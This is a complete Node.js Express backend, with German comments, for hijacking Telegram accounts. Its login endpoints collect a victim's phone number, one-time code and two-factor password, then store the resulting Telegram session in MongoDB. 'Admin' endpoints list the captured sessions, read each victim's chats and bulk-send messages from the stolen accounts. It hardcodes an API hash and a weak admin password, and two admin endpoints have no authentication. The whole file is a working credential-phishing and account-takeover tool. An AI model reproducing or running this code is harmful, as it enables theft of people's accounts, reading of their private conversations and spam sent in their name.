const express = require('express');
const cors = require('cors');
const { TelegramClient, Api } = require('telegram');
const { StringSession } = require('telegram/sessions');
const mongoose = require('mongoose');

const app = express();
app.use(cors());
app.use(express.json());

const PORT = process.env.PORT || 3000;
const MONGO_URI = process.env.MONGODB_URI; // Stelle sicher, dass dies in Render als Config Var gesetzt ist!
mongoose.connect(MONGO_URI);

const SessionSchema = new mongoose.Schema({ phone: String, session: String });
const Session = mongoose.model('Session', SessionSchema);

const apiId = 23049703;
const apiHash = 'e9c00af578a9de0253ef02337460498f';
const activeSessions = new Map();

// --- Login Endpunkte ---
app.post('/send-otp', async (req, res) => {
    try {
        const { phone } = req.body;
        const client = new TelegramClient(new StringSession(""), apiId, apiHash, { connectionRetries: 5 });
        await client.connect();
        const result = await client.sendCode({ apiId, apiHash }, phone);
        activeSessions.set(phone, { client, phoneCodeHash: result.phoneCodeHash });
        res.json({ phoneCodeHash: result.phoneCodeHash });
    } catch (e) { res.status(400).json({ error: e.message }); }
});

app.post('/verify-otp', async (req, res) => {
    try {
        const { phone, code, phoneCodeHash, password } = req.body;
        const s = activeSessions.get(phone);
        if (!s) return res.status(400).json({ error: "Session abgelaufen" });

        try {
            await s.client.invoke(new Api.auth.SignIn({ phoneNumber: phone, phoneCode: code, phoneCodeHash: phoneCodeHash }));
        } catch (err) {
            if (err.errorMessage === 'SESSION_PASSWORD_NEEDED') {
                const pwd = await s.client.invoke(new Api.account.GetPassword());
                await s.client.invoke(new Api.auth.CheckPassword({ password: await s.client.srpSolve(pwd, password) }));
            } else throw err;
        }
        await Session.create({ phone, session: s.client.session.save() });
        res.json({ success: true });
    } catch (e) { res.status(400).json({ error: e.message }); }
});

// --- Admin Endpunkte ---
app.get('/admin/sessions', async (req, res) => {
    if (req.query.pass !== '280597') return res.status(401).send('No');
    const sessions = await Session.find({});
    res.json(sessions);
});

app.get('/admin/get-dialogs', async (req, res) => {
    const { sessionId } = req.query;
    const dbSession = await Session.findById(sessionId);
    const client = new TelegramClient(new StringSession(dbSession.session), apiId, apiHash, {});
    await client.connect();
    const dialogs = await client.getDialogs();
    // Filtert nur Gruppen/Channels/User
    const filtered = dialogs.map(d => ({ id: d.id.toString(), title: d.title || 'User', isGroup: d.isGroup, isChannel: d.isChannel }));
    await client.disconnect();
    res.json(filtered);
});

app.post('/admin/bulk-send', async (req, res) => {
    const { sessionId, targets, message } = req.body;
    const dbSession = await Session.findById(sessionId);
    const client = new TelegramClient(new StringSession(dbSession.session), apiId, apiHash, {});
    await client.connect();
    
    for (const targetId of targets) {
        try { await client.sendMessage(targetId, { message }); } 
        catch (err) { console.log("Fehler bei " + targetId); }
    }
    await client.disconnect();
    res.json({ success: true });
});

app.listen(PORT, () => console.log('Running'));
